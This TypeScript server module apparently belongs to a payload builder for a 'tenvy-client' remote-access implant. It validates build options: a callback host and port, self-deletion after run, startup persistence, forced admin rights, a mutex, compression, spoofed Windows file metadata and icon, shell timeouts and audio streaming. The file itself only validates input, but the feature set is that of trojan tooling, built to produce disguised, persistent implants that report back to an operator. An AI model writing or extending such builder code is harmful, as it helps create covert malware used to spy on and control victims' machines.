import { error } from '@sveltejs/kit';
import { ZodError } from 'zod';
import {
	ALLOWED_EXTENSIONS_BY_OS,
	TARGET_ARCHITECTURES_BY_OS,
	TARGET_OS_VALUES,
	type BuildRequest,
	type TargetArch,
	type TargetOS,
	type WindowsFileInformation
} from '../../../../../shared/types/build';
import { buildRequestSchema } from '$lib/validation/build-schema';

const allowedTargetOS = new Set<TargetOS>(TARGET_OS_VALUES);
const architectureMatrix = new Map<TargetOS, Set<TargetArch>>(
	TARGET_OS_VALUES.map((os) => [os, new Set(TARGET_ARCHITECTURES_BY_OS[os])])
);
const extensionMatrix = new Map<TargetOS, Set<string>>(
	TARGET_OS_VALUES.map((os) => [os, new Set(ALLOWED_EXTENSIONS_BY_OS[os])])
);

export const mutexSanitizer = /[^A-Za-z0-9._-]/g;
const allowedFileInfoEntries = [
	['fileDescription', 'FileDescription'],
	['productName', 'ProductName'],
	['companyName', 'CompanyName'],
	['productVersion', 'ProductVersion'],
	['fileVersion', 'FileVersion'],
	['originalFilename', 'OriginalFilename'],
	['internalName', 'InternalName'],
	['legalCopyright', 'LegalCopyright']
] as const satisfies readonly [keyof WindowsFileInformation, string][];

const allowedFileInfoKeys = new Map(allowedFileInfoEntries);
const maxVersionComponent = 65535;
const maxMutexLength = 120;

type NormalizedAudioStreaming = 'enabled' | 'disabled' | 'unset';

function resolveTargetOS(value?: string): TargetOS {
	if (!value) {
		return 'windows';
	}
	const normalized = value.toLowerCase().trim();
	if (allowedTargetOS.has(normalized as TargetOS)) {
		return normalized as TargetOS;
	}
	return 'windows';
}

function resolveTargetArch(value: string | undefined, targetOS: TargetOS): TargetArch {
	const options = architectureMatrix.get(targetOS) ?? new Set<TargetArch>(['amd64']);
	const fallback = options.values().next().value ?? 'amd64';
	if (!value) {
		return fallback;
	}
	const normalized = value.toLowerCase().trim();
	if (options.has(normalized as TargetArch)) {
		return normalized as TargetArch;
	}
	return fallback;
}

function resolveExtension(value: string | undefined, targetOS: TargetOS): string {
	const options = extensionMatrix.get(targetOS) ?? new Set(['.exe']);
	if (!value) {
		return options.values().next().value ?? '.exe';
	}

	const normalized = value.startsWith('.') ? value.toLowerCase() : `.${value.toLowerCase()}`;
	if (options.has(normalized)) {
		return normalized;
	}

	throw error(400, `Extension ${normalized} is not supported for ${targetOS} builds.`);
}

function sanitizeFilename(value: string, extension: string): string {
	const lowerExtension = extension.toLowerCase();
	let base = value;

	if (lowerExtension && base.toLowerCase().endsWith(lowerExtension)) {
		base = base.slice(0, -lowerExtension.length);
	}

	const cleaned = base.replace(/[^A-Za-z0-9._-]/g, '_').replace(/\.+$/, '');
	const safeBase = cleaned.length > 0 ? cleaned : `tenvy-client-${Date.now()}`;

	return `${safeBase}${lowerExtension}`;
}

function sanitizePositiveInteger(
	value: string | number | undefined,
	min: number,
	max: number,
	label: string
): string | null {
	if (value === undefined || value === null) {
		return null;
	}

	const normalized = value.toString().trim();
	if (normalized === '') {
		return null;
	}

	if (!/^\d+$/.test(normalized)) {
		throw error(400, `${label} must be a positive integer.`);
	}

	const parsed = Number.parseInt(normalized, 10);
	if (!Number.isFinite(parsed)) {
		throw error(400, `${label} must be a valid number.`);
	}

	if (parsed < min || parsed > max) {
		throw error(400, `${label} must be between ${min} and ${max}.`);
	}

	return String(parsed);
}

function sanitizeMutexName(value: string | undefined): string {
        if (!value) {
                return '';
        }
	const trimmed = value.trim();
	if (!trimmed) {
		return '';
	}
	const sanitized = trimmed.replace(mutexSanitizer, '_');
	return sanitized.slice(0, maxMutexLength);
}

function normalizeAudioStreaming(value: BuildRequest['audio'] | undefined): NormalizedAudioStreaming {
        if (!value || value.streaming === undefined) {
                return 'unset';
        }

        return value.streaming ? 'enabled' : 'disabled';
}

type VersionParts = { Major: number; Minor: number; Patch: number; Build: number };

export type NormalizedFileInformation = Record<string, string>;

export function sanitizeFileInformationPayload(
	payload: BuildRequest['fileInformation'] | null | undefined
): NormalizedFileInformation {
	if (!payload) {
		return {};
	}
	const normalized: NormalizedFileInformation = {};
	for (const [key, label] of allowedFileInfoKeys.entries()) {
		const raw = payload[key];
		if (typeof raw !== 'string') {
			continue;
		}
		const trimmed = raw.trim();
		if (!trimmed) {
			continue;
		}
		normalized[label] = trimmed.slice(0, 256);
	}
	return normalized;
}

export function hasFileInformationPayload(payload: NormalizedFileInformation): boolean {
	return Object.keys(payload).length > 0;
}

export function parseVersionParts(value: string | undefined): VersionParts | null {
	if (!value) {
		return null;
	}
	const trimmed = value.trim();
	if (!trimmed) {
		return null;
	}
	const segments = trimmed.split('.').slice(0, 4);
	const numbers: number[] = [];
	for (const segment of segments) {
		const parsed = Number.parseInt(segment, 10);
		if (!Number.isFinite(parsed) || parsed < 0) {
			numbers.push(0);
			continue;
		}
		numbers.push(Math.min(parsed, maxVersionComponent));
	}
	while (numbers.length < 4) {
		numbers.push(0);
	}
	return {
		Major: numbers[0] ?? 0,
		Minor: numbers[1] ?? 0,
		Patch: numbers[2] ?? 0,
		Build: numbers[3] ?? 0
	};
}

export type NormalizedBuildRequest = {
        host: string;
        port: string;
        targetOS: TargetOS;
        targetArch: TargetArch;
	outputExtension: string;
	outputFilename: string;
	installationPath: string;
	meltAfterRun: boolean;
	startupOnBoot: boolean;
	developerMode: boolean;
	mutexName: string;
	compressBinary: boolean;
	forceAdmin: boolean;
	pollIntervalMs: string | null;
	maxBackoffMs: string | null;
        shellTimeoutSeconds: string | null;
        fileIcon: BuildRequest['fileIcon'] | null | undefined;
        fileInformation: BuildRequest['fileInformation'] | null | undefined;
        audio: { streaming: NormalizedAudioStreaming };
        raw: BuildRequest;
};

function formatZodError(err: ZodError): string {
	const issue = err.issues[0];
	if (!issue) {
		return 'Invalid build payload.';
	}
	const path = issue.path.join('.') || 'payload';
	return `${path}: ${issue.message}`;
}

export function normalizeBuildRequestPayload(body: unknown): NormalizedBuildRequest {
	let parsed: BuildRequest;
	try {
		parsed = buildRequestSchema.parse(body);
	} catch (err) {
		if (err instanceof ZodError) {
			throw error(400, formatZodError(err));
		}
		throw error(400, 'Invalid build payload.');
	}

	const host = parsed.host.toString().trim();
	if (!host) {
		throw error(400, 'Host is required');
	}

	if (/\s/.test(host)) {
		throw error(400, 'Host cannot contain whitespace');
	}

	const port = parsed.port !== undefined ? parsed.port.toString().trim() : '2332';
	if (!/^\d+$/.test(port)) {
		throw error(400, 'Port must be numeric');
	}

	const targetOS = resolveTargetOS(parsed.targetOS);
	const targetArch = resolveTargetArch(parsed.targetArch, targetOS);
	const outputExtension = resolveExtension(parsed.outputExtension, targetOS);
	const outputFilename = sanitizeFilename(
		(parsed.outputFilename ?? 'tenvy-client').toString().trim(),
		outputExtension
	);
	const installationPath = (parsed.installationPath ?? '').toString().trim();
	const developerMode = parsed.developerMode !== false;
	const meltAfterRun = Boolean(parsed.meltAfterRun);
	const startupOnBoot = Boolean(parsed.startupOnBoot);
	const mutexName = sanitizeMutexName(parsed.mutexName);
	const compressBinary = Boolean(parsed.compressBinary);
	const forceAdmin = Boolean(parsed.forceAdmin);

	const pollIntervalMs = sanitizePositiveInteger(
		parsed.pollIntervalMs,
		1000,
		3_600_000,
		'Poll interval'
	);
	const maxBackoffMs = sanitizePositiveInteger(
		parsed.maxBackoffMs,
		1000,
		86_400_000,
		'Max backoff'
	);
	const shellTimeoutSeconds = sanitizePositiveInteger(
		parsed.shellTimeoutSeconds,
		5,
		7_200,
		'Shell timeout'
	);

        return {
                host,
                port,
                targetOS,
                targetArch,
		outputExtension,
		outputFilename,
		installationPath,
		meltAfterRun,
		startupOnBoot,
		developerMode,
		mutexName,
		compressBinary,
		forceAdmin,
		pollIntervalMs,
		maxBackoffMs,
                shellTimeoutSeconds,
                fileIcon: parsed.fileIcon ?? null,
                fileInformation: parsed.fileInformation ?? null,
                audio: { streaming: normalizeAudioStreaming(parsed.audio) },
                raw: parsed
        } satisfies NormalizedBuildRequest;
}
